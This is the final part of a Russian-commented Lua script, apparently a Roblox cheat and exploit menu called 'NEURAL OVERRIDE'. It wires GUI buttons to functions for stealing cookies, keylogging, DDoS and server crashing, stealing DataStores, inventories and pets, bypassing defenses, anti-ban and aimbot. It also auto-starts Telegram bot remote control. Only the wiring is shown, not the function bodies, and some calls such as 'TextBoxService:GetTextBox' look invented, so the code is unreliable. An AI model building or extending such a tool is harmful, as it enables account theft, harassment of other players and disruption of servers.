                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
                if name and name ~= "" then teleportToPlayer(name) end
            end, Color3.new(0,1,0.5))
            addButton("🛡️ God Mode", toggleGod, Color3.new(0.5,0.5,1))
            addButton("🔫 Spawn Weapon", spawnWeapon, Color3.new(1,0.5,0))
            addButton("📨 Mass Invite", massInvite, Color3.new(0.2,1,0.6))
            addButton("👥 Summon All", summonAllPlayers, Color3.new(1,0.8,0))
            addButton("🌀 All Modes", allModes, Color3.new(0.8,0,0.8))
            addButton("💀 Kill All", killAll, Color3.new(1,0,0))
            addButton("🚀 Fly All", flyAll, Color3.new(0,0.8,0.8))
            addButton("🌍 Global Chaos", globalChaos, Color3.new(0.9,0.1,0.5))
            addButton("🚀 Invade", invade, Color3.new(0.8,0.4,0))
            addButton("💥 Server Crasher", serverCrasher, Color3.new(1,0.2,0.2))
            addButton("🧊 Freeze All", freezeAll, Color3.new(0,0.6,1))
            addButton("🦴 Ragdoll All", ragdollAll, Color3.new(0.8,0.5,0))
            addButton("👥 Teleport All to Me", teleportAllToMe, Color3.new(0.9,0.5,0.8))
        elseif currentTab == 2 then
            addButton("🧟 Spawn Bots (10)", function() spawnBots(10) end, Color3.new(0.8,0.6,0))
            addButton("🧟 Spawn Bots (50)", function() spawnBots(50) end, Color3.new(0.8,0.6,0))
            addButton("👹 Smart Monsters (10)", function() spawnSmartMonsters(10) end, Color3.new(0.8,0,0.6))
            addButton("👹 Smart Monsters (30)", function() spawnSmartMonsters(30) end, Color3.new(0.8,0,0.6))
            addButton("🌀 Portal (5)", function() createPortals(5) end, Color3.new(0.5,0,0.8))
            addButton("🌀 Portal (15)", function() createPortals(15) end, Color3.new(0.5,0,0.8))
            addButton("🤖 AutoBot", function() createAutoBot() end, Color3.new(0.2,0.8,0.8))
            addButton("👑 God Bot", godBotMode, Color3.new(0.8,0.8,0))
            addButton("👥 Clone Player", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
                if name and name ~= "" then clonePlayer(name) end
            end, Color3.new(0.2,0.4,0.8))
            addButton("🏃 Follow Me", followMe, Color3.new(0,0.6,0.6))
            addButton("👾 Clone Army (50)", function() cloneArmy(50) end, Color3.new(0.6,0.2,0.9))
        elseif currentTab == 3 then
            addButton("💀 Hack Target", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
                if name and name ~= "" then hackTarget(name) end
            end, Color3.new(1,0,0))
            addButton("💀 DDoS Target", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
                if name and name ~= "" then ddosTarget(name) end
            end, Color3.new(1,0.3,0))
            addButton("👁️ Track Player", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
                if name and name ~= "" then trackPlayer(name) end
            end, Color3.new(0,0.8,0.8))
            addButton("💥 Remote Ban", remoteBan, Color3.new(0.8,0,0.8))
            addButton("💥 Game Crash", crashGame, Color3.new(1,0.5,0))
            addButton("📦 Steal DataStore", stealDataStore, Color3.new(0.2,0.6,1))
            addButton("🍪 Steal Cookie", stealCookie, Color3.new(0.2,0.8,0.4))
            addButton("⌨️ Keylog", toggleKeylog, Color3.new(0.5,0.5,0.5))
            addButton("💻 Exploit Shell", function()
                local cmd = game:GetService("TextBoxService"):GetTextBox("Команда")
                if cmd and cmd ~= "" then executeShell(cmd) end
            end, Color3.new(0.6,0.2,0.4))
            addButton("🔍 Hack All", hackAll, Color3.new(0.9,0.2,0.2))
            addButton("📡 Admin Panel", function()
                local prompt = "Сгенерируй Lua-код для создания админ-панели в Roblox: GUI с кнопками (кик, бан, телепорт, дать предмет)."
                aiCommand(prompt)
            end, Color3.new(0.3,0.8,0.3))
            addButton("🛡 Bypass Defenses", bypassAllDefenses, Color3.new(0.1,0.9,0.1))
            addButton("🔓 Admin Hack", adminHack, Color3.new(0.8,0.4,0))
        elseif currentTab == 4 then
            addButton("🎯 Aimbot", toggleAimbot, Color3.new(0,1,0.3))
            addButton("🎯 Silent Aim", toggleSilentAim, Color3.new(0,0.8,0.5))
            addButton("👁️ ESP", toggleESP, Color3.new(0,0.5,1))
            addButton("🚫 Anti-Kick", toggleAntiKick, Color3.new(1,0.5,0))
            addButton("💨 Speed (100)", function() setSpeed(100) end, Color3.new(0.2,0.8,0.8))
            addButton("💨 Speed (200)", function() setSpeed(200) end, Color3.new(0.2,0.8,0.8))
            addButton("🧱 NoClip", toggleNoClip, Color3.new(0.6,0.3,0.9))
            addButton("🦘 Infinite Jump", toggleInfiniteJump, Color3.new(0,1,0.6))
            addButton("👻 Invisible", toggleInvisible, Color3.new(0.4,0.4,0.8))
            addButton("☀️ FullBright", setFullBright, Color3.new(1,1,0.2))
            addButton("💬 Anti-AFK", toggleAntiAFK, Color3.new(0.3,0.7,0.4))
            addButton("🌀 Infinite Yield", function() infiniteYield() end, Color3.new(0.8,0.2,0.6))
            addButton("🛡️ Anti-Ban", antiBan, Color3.new(0,0.6,0.6))
            addButton("🧹 Clear GUI", clearGUI, Color3.new(0.4,0.4,0.4))
            addButton("💥 Spawn Parts (500)", function() spawnParts(500) end, Color3.new(0.8,0.4,0.2))
            addButton("🔥 Terminator", toggleTerminator, Color3.new(1,0.2,0.2))
            addButton("👻 Ghost Assassin", toggleAssassin, Color3.new(0.6,0.2,0.9))
            addButton("💣 Nuke", nuke, Color3.new(1,0.5,0))
            addButton("🌀 Mega Crash", megaCrash, Color3.new(0.8,0,0))
        elseif currentTab == 5 then
            addButton("🧠 Mind Control", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
                if name and name ~= "" then mindControl(name) end
            end, Color3.new(0.8,0.2,0.8))
            addButton("👤 Fake Player", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя фейка")
                if name and name ~= "" then createFakePlayer(name) end
            end, Color3.new(0.2,0.6,0.8))
            addButton("🌤️ Weather", function()
                local type = game:GetService("TextBoxService"):GetTextBox("Тип погоды (дождь/снег/туман/буря)")
                if type and type ~= "" then changeWeather(type) end
            end, Color3.new(0.2,0.8,0.6))
            addButton("🌀 Zone (low gravity)", createZone, Color3.new(0.6,0.2,0.6))
            addButton("🏗️ Build", function()
                local desc = game:GetService("TextBoxService"):GetTextBox("Описание постройки")
                if desc and desc ~= "" then buildFromDescription(desc) end
            end, Color3.new(0.8,0.5,0.2))
            addButton("⚔️ Force PvP", forcePvP, Color3.new(0.8,0.2,0))
            addButton("☠️ Curse Player", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
                if name and name ~= "" then cursePlayer(name) end
            end, Color3.new(0.2,0.2,0.8))
            addButton("🔄 Invert Controls", invertControls, Color3.new(0.5,0.5,0))
            addButton("🎒 Scramble Inventory", scrambleInventory, Color3.new(0.8,0.6,0.4))
            addButton("🐾 Steal Pet", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
                if name and name ~= "" then stealPet(name) end
            end, Color3.new(0.2,0.8,0.4))
            addButton("🚫 Fake Ban", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
                if name and name ~= "" then fakeBan(name) end
            end, Color3.new(0.8,0.2,0.4))
            addButton("🎵 Music All", function()
                local id = game:GetService("TextBoxService"):GetTextBox("ID музыки")
                if id and id ~= "" then playMusicForAll(id) end
            end, Color3.new(0.2,0.8,0.8))
            addButton("📢 Notify All", function()
                local text = game:GetService("TextBoxService"):GetTextBox("Текст уведомления")
                if text and text ~= "" then notifyAll(text) end
            end, Color3.new(0.8,0.8,0.2))
            addButton("👥 Clone Control", cloneWithControl, Color3.new(0.6,0.4,0.8))
            addButton("👻 Possession", possession, Color3.new(0.8,0,0.8))
            addButton("⏳ Time Warp", function()
                local speed = game:GetService("TextBoxService"):GetTextBox("Скорость (число)")
                if speed and speed ~= "" then timeWarp(tonumber(speed) or 2) end
            end, Color3.new(0.2,0.4,0.8))
            addButton("💣 Spawn Trap", spawnTrap, Color3.new(0.8,0.4,0.2))
            addButton("🏝️ Spawn Island", spawnIsland, Color3.new(0,0.6,0.6))
            addButton("💬 Chat Control", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
                local msg = game:GetService("TextBoxService"):GetTextBox("Сообщение")
                if name and msg and name~="" and msg~="" then chatControl(name, msg) end
            end, Color3.new(0.4,0.4,0.8))
        end
    end
    updateContent()
end

-- ===== ДОПОЛНИТЕЛЬНЫЕ ПАНЕЛИ (Терминатор + Революция) =====
local function addExtraPanels()
    -- Панель Терминатора
    local gui1 = Instance.new("ScreenGui")
    gui1.Name = "TerminatorPanel"
    gui1.Parent = player.PlayerGui
    local frame1 = Instance.new("Frame")
    frame1.Size = UDim2.new(0, 200, 0, 180)
    frame1.Position = UDim2.new(0.85, 0, 0.5, 0)
    frame1.BackgroundColor3 = Color3.new(0.2, 0.1, 0.2)
    frame1.BackgroundTransparency = 0.6
    frame1.Parent = gui1
    local title1 = Instance.new("TextLabel")
    title1.Size = UDim2.new(1,0,0,30)
    title1.Text = "⚡ ТЕРМИНАТОР"
    title1.TextColor3 = Color3.new(1,0,0)
    title1.BackgroundTransparency = 1
    title1.TextScaled = true
    title1.Font = Enum.Font.GothamBold
    title1.Parent = frame1
    local btn1 = Instance.new("TextButton")
    btn1.Size = UDim2.new(0.9,0,0,40)
    btn1.Position = UDim2.new(0.05,0,0.2,0)
    btn1.Text = "🔫 Терминатор"
    btn1.BackgroundColor3 = Color3.new(0.8,0,0)
    btn1.TextColor3 = Color3.new(1,1,1)
    btn1.Font = Enum.Font.GothamBold
    btn1.TextScaled = true
    btn1.Parent = frame1
    btn1.MouseButton1Click:Connect(toggleTerminator)
    local btn2 = btn1:Clone()
    btn2.Position = UDim2.new(0.05,0,0.45,0)
    btn2.Text = "🛡 Обход защит"
    btn2.BackgroundColor3 = Color3.new(0,0.4,0.8)
    btn2.Parent = frame1
    btn2.MouseButton1Click:Connect(bypassAllDefenses)
    local btn3 = btn1:Clone()
    btn3.Position = UDim2.new(0.05,0,0.7,0)
    btn3.Text = "🎤 Голос (вкл)"
    btn3.BackgroundColor3 = Color3.new(0.6,0.2,0.6)
    btn3.Parent = frame1
    btn3.MouseButton1Click:Connect(function()
        if telegramPolling then
            stopTelegramPolling()
            btn3.Text = "🎤 Голос (вкл)"
        else
            startTelegramPolling()
            btn3.Text = "🎤 Голос (выкл)"
        end
    end)

    -- Панель Революции
    local gui2 = Instance.new("ScreenGui")
    gui2.Name = "RevolutionPanel"
    gui2.Parent = player.PlayerGui
    local frame2 = Instance.new("Frame")
    frame2.Size = UDim2.new(0, 250, 0, 400)
    frame2.Position = UDim2.new(0.01, 0, 0.1, 0)
    frame2.BackgroundColor3 = Color3.new(0.1, 0.1, 0.2)
    frame2.BackgroundTransparency = 0.8
    frame2.Parent = gui2
    local title2 = Instance.new("TextLabel")
    title2.Size = UDim2.new(1,0,0,30)
    title2.Text = "🔥 РЕВОЛЮЦИЯ"
    title2.TextColor3 = Color3.new(1,0,0)
    title2.BackgroundTransparency = 1
    title2.TextScaled = true
    title2.Font = Enum.Font.GothamBold
    title2.Parent = frame2
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1,0,1,-30)
    scroll.Position = UDim2.new(0,0,0,30)
    scroll.BackgroundTransparency = 1
    scroll.CanvasSize = UDim2.new(0,0,0,0)
    scroll.Parent = frame2
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0,5)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = scroll

    local function addRevBtn(text, cb, color)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1,-10,0,35)
        btn.Text = text
        btn.BackgroundColor3 = color or Color3.new(0.8,0.2,0.8)
        btn.TextColor3 = Color3.new(1,1,1)
        btn.Font = Enum.Font.GothamBold
        btn.TextScaled = true
        btn.Parent = scroll
        btn.MouseButton1Click:Connect(cb)
        task.defer(function()
            scroll.CanvasSize = UDim2.new(0,0,0, layout.AbsoluteContentSize.Y + 10)
        end)
    end

    addRevBtn("💥 MegaCrash", megaCrash, Color3.new(1,0,0))
    addRevBtn("🌀 Invert Reality", invertReality, Color3.new(0.5,0,0.8))
    addRevBtn("🛠 Make Cheat", function()
        local desc = game:GetService("TextBoxService"):GetTextBox("Опишите чит")
        if desc and desc ~= "" then makeCheat(desc) end
    end, Color3.new(0.2,0.8,0.8))
    addRevBtn("💰 Steal All Inventory", stealAllInventory, Color3.new(1,0.8,0))
    addRevBtn("👥 Clone Army", function() cloneArmy(50) end, Color3.new(0,0.8,0.4))
    addRevBtn("💣 Nuke", nuke, Color3.new(1,0.3,0))
    addRevBtn("👻 Ghost Assassin", toggleAssassin, Color3.new(0.6,0.2,0.9))
    addRevBtn("⏳ AutoFarm", startAutoFarm, Color3.new(0.2,0.6,0.2))
    addRevBtn("🔓 Admin Hack", adminHack, Color3.new(0.8,0.4,0))
    addRevBtn("🏝 Spawn Island", spawnIsland, Color3.new(0,0.6,0.6))
    addRevBtn("💬 Chat Control", function()
        local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
        local msg = game:GetService("TextBoxService"):GetTextBox("Сообщение")
        if name and msg and name~="" and msg~="" then chatControl(name, msg) end
    end, Color3.new(0.4,0.4,0.8))
end

-- ===== ЗАПУСК =====
task.wait(1)
createGUI()
task.wait(1)
addExtraPanels()

-- Автоматический запуск Telegram, если настроен
if TELEGRAM_BOT_TOKEN ~= "ваш_токен_бота" then
    startTelegramPolling()
end

print("🧠 NEURAL OVERRIDE v7.1 ULTIMATE FULL EDITION ЗАГРУЖЕНА!")
print("📋 Введите /help в чат для списка команд")
print("🔥 Все функции готовы к использованию!")
